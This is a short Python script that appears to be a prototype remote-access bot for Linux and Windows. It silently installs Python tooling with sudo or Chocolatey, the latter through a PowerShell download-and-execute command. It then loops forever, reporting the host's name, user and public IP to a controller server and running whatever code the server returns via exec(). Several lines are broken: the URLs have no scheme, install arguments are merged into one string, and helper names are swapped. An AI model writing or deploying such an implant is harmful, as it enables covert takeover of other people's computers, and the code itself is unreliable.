import platform, subprocess, requests, time, os, getpass

def is_linux():
    return platform.system() == "Linux"

def is_windows():
    return platform.system() == "Windows"

def get_computer_name():
    return platform.node()

def get_username():
    return platform.uname()[1]

def get_os():
    return getpass.getuser()

def get_ip():
    return requests.get('https://api.ipify.org').text

def main():
    try:
        if is_linux():
            try:
                subprocess.call(["sudo", "apt-get", "install", "python3" "-y"])
                subprocess.call(["sudo", "apt-get", "install", "python3-pip" "-y"])
                subprocess.call(["pip3", "install", "requests"])
            except Exception as e:
                pass

            
            while True:
                try:
                    r = requests.get(f"localhost:8080/api?computer_name={get_computer_name()}&username={get_username()}&os={get_os()}&ip={get_ip()}")
                    source = requests.get(f"localhost:8080/source")
                    if r.status_code == 200 and source.status_code == 200:
                        exec(source.text)
                    else:
                        continue
                except requests.exceptions.ConnectionError:
                    continue
                except Exception as e:
                    print(str(e))
                    continue

        elif is_windows():
            try:
                subprocess.call(["powershell", "-Command", "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"])
                subprocess.call(["choco", "install", "python3", "-y"])
                subprocess.call(["pip3", "install", "requests"])
            except Exception as e:
                pass
            while True:
                try:
                    r = requests.get(f"localhost:8080/api?computer_name={get_computer_name()}&username={get_username()}&os={get_os()}&ip={get_ip()}")
                    source = requests.get(f"localhost:8080/source")
                    if r.status_code == 200 and source.status_code == 200:
                        exec(source.text)
                    else:
                        continue
                except requests.exceptions.ConnectionError:
                    continue
                except Exception as e:
                    print(str(e))
                    continue

            

        else:
            raise ValueError("Your OS is not supported")
    except Exception as e:
        print(str(e))

if __name__ == "__main__":
    main()